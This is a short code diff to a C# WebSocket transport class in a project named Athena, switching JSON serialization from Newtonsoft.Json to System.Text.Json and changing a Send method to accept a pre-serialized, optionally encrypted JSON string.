@@ -1,7 +1,7 @@
 ﻿using Athena.Models;
 using Athena.Models.Config;
 using Athena.Utilities;
-using Newtonsoft.Json;
+using System.Text.Json;
 using System;
 using System.IO;
 using System.Net.WebSockets;
@@ -96,7 +96,7 @@ namespace Athena
             }
         }
 
-        public async Task<string> Send(object obj)
+        public async Task<string> Send(string json)
         {
             if(this.ws.State != WebSocketState.Open)
             {
@@ -105,7 +105,6 @@ namespace Athena
 
             try
             {
-                string json = JsonConvert.SerializeObject(obj);
                 if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
@@ -122,7 +121,7 @@ namespace Athena
                     Tag = String.Empty
                 };
 
-                string message = JsonConvert.SerializeObject(m);
+                string message = JsonSerializer.Serialize(m);
                 byte[] msg = Encoding.UTF8.GetBytes(message);
                 await ws.SendAsync(msg, WebSocketMessageType.Text, true, CancellationToken.None);
                 message = await Receive(ws);
@@ -132,7 +131,7 @@ namespace Athena
                     return String.Empty;
                 }
 
-                m = JsonConvert.DeserializeObject<WebSocketMessage>(message);
+                m = JsonSerializer.Deserialize<WebSocketMessage>(message);
 
 
 
